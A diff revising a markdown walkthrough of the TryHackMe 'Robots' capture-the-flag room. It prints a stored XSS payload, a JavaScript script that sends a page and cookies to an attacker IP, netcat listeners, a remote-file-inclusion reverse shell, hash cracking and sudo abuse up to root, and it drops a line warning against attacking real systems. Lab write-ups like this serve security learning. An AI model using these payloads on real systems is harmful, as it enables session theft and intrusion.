@@ -23,21 +23,22 @@
 
 ---
 
-## 0x00. Scope & Setup
+## 1. Scope & Setup
 
-- Target IP: `TARGET_IP` (add `robots.thm` in `/etc/hosts` if the app expects that hostname).  
+- Target IP: `TARGET_IP` (add `robots.thm` in `/etc/hosts`).  
 - Attacker IP: `ATTACKER_IP` (examples below use `10.8.137.194`).  
-- All actions performed for learning (TryHackMe) – **do not attack real systems** without permission.
+- All actions performed for learning (TryHackMe)
 
-> If the site forces host `robots.thm`, add to your hosts file:  
 > `echo "TARGET_IP robots.thm" | sudo tee -a /etc/hosts`
 
 ---
 
-## 0x01. Recon
+## 2. Initial Reconnaissance
+
+The first step in any penetration test is reconnaissance. I ran an **Nmap** scan to discover open ports and services:
 
 ```bash
-nmap -sCV -p- TARGET_IP
+nmap -sCV robots.thm -p-
 ```
 
 **Open ports found:**
@@ -58,9 +59,9 @@ Visit **`/harm/to/self`**. There are **login** and **registration** endpoints.
 
 ---
 
-## 0x02. Registration Logic (Password Derivation)
+## 3. Registration & Login
 
-From reviewing the app source (`register.php` & `config.php`), initial password generation is:
+From reviewing the the information given on the registration page, its pretty easy to generate our password:
 
 - User submits **username** and **date of birth**.
 - Backend sets password to **`md5(username + ddmm)`** (day+month).
@@ -68,50 +69,74 @@ From reviewing the app source (`register.php` & `config.php`), initial password 
 > Example: username **`tester`**, DOB **`29/08/2005`** → string **`tester2908`** →  
 > `md5("tester2908") = b9b0bf8917bd8c86327ad4c31ef090de`
 
-This matches what we later saw for the `tester` account.
+That would be the generated password for that user.
 
 ---
 
-## 0x03. Stored XSS → Cookie Steal → Admin Panel
+## 4. Finding Sensitive Files (XSS Vulnerability)
 
-The **registration** input is **vulnerable to stored XSS**. We verified with:
+After registering and logging in, I found a file called `server_info.php` which revealed server configurations. This looked sensitive.
+
+The **registration form** itself was vulnerable to **stored XSS**. To confirm, I used:
 
 ```html
-<script src="http://ATTACKER_IP/test.txt"></script>
+<script src="http://10.8.137.194/tester.txt"></script>
 ```
 
-After confirming callbacks, we weaponized XSS to **exfiltrate** `server_info.php` (and usable cookie) back to our box:
+I hosted this file with Python:
 
-**`xss.js`** (served from attacker’s http server):
+```bash
+python3 -m http.server 8000
+```
+
+And sure enough, the script executed, confirming stored XSS.
+
+After confirming callbacks, we will weaponize XSS to **exfiltrate** `server_info.php` (and usable cookie) back to our box:
+
+## 5. Exploiting XSS for Cookie Theft
+
+Next, I created a script `xss.js` to exfiltrate cookies:
+
 ```javascript
 async function exfil() {
-  const response = await fetch('/harm/to/self/server_info.php');
-  const text = await response.text();
-  await fetch('http://ATTACKER_IP:88/exfil', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: `data=${btoa(text)}`
-  });
+    const response = await fetch('/harm/to/self/server_info.php');
+    const text = await response.text();
+
+    await fetch('http://10.8.137.194:88/exfil', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `data=${btoa(text)}`
+    });
 }
+
 exfil();
 ```
 
-- Host: `python3 -m http.server 8000` (serves `/xss.js`)
-- Listener: `nc -lvnp 88` to receive the base64 blob
+I hosted it:
 
-Register a user with payload in the **username** field (or a field reflected/stored by admin view):
-
-```html
-<script src="http://ATTACKER_IP:8000/xss.js"></script>
+```bash
+python3 -m http.server 8000
 ```
 
-Decode data (CyberChef) → recover **cookie/session** allowing access to **`/harm/to/self/admin.php`**.
+Then registered with:
+
+```html
+<script src="http://10.8.137.194/xss.js"></script>
+```
+
+Finally, I listened on my box:
+
+```bash
+nc -lvnp 88
+```
+
+This gave me base64-encoded data containing cookies. After decoding with CyberChef, I retrieved a valid **admin session cookie**, & by appending the stolen cookie into my browser session, I accessed `http://robots.thm/admin.php`.
 
 ---
 
-## 0x04. RFI on `admin.php` → Reverse Shell (www-data in container)
+## 6. RFI on `admin.php` → Reverse Shell (www-data in container)
 
-The `admin.php` page exposes a single **URL input**. It’s **RFI**-vulnerable. Test with a benign URL to your server:
+The `admin.php` page exposes a single **URL input**. Which is **RFI**-vulnerable. To test, we will use a benign URL to your server:
 
 ```
 http://ATTACKER_IP:8000/test.txt
@@ -139,11 +164,11 @@ Submit to admin form:
 http://ATTACKER_IP:8000/shell.php
 ```
 
-**Result:** reverse shell as **`www-data`** inside a **Docker container**.
+**Result:** reverse shell as **`www-data`**.
 
 ---
 
-## 0x05. Container Enumeration → DB Pivot
+## 7. Container Enumeration → DB Pivot
 
 Container mounts and “db” host discovery:
 
@@ -219,12 +244,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 rgiskard.hash
 
 ---
 
-## 0x06. SSH as `rgiskard` → Abuse Sudo curl Rule (to become `dolivaw`)
+## 8. SSH as `rgiskard` → Abuse Sudo curl Rule (to become `dolivaw`)
 
 SSH in:
 
 ```bash
 ssh rgiskard@robots.thm
+Password: Use cracked password
 ```
 
 Check sudo:
@@ -271,7 +297,7 @@ ssh -i id_ed25519 dolivaw@robots.thm
 
 ---
 
-## 0x07. `dolivaw` → Root via Apache (`NOPASSWD`)
+## 9. `dolivaw` → Root via Apache (`NOPASSWD`)
 
 Check sudo again:
 
@@ -317,7 +343,7 @@ Grab the **root flag (Flag #2)**:
 
 ```bash
 cat /root/root.txt
-# THM{2a279561f5eea907f7617df3982cee24}
+# THM{2a279561f{Redacted}f3982cee24}
 ```
 
 ---
@@ -332,7 +358,7 @@ cat /root/root.txt
 
 ---
 
-## 0x0A. Appendix – Handy Commands
+## 0x10. Appendix – Handy Commands
 
 ```bash
 # Recon
@@ -379,5 +405,4 @@ sudo /usr/sbin/apache2 -f /tmp/root.conf -k start
 ---
 
 ## Credits
-
-Big thanks to your future self for coming back to add any remaining screenshots (Nmap output, Burp captures, DB dumps) and the exact cracked plaintext for `rgiskard` if you want it recorded.
+### LordElMeloi.
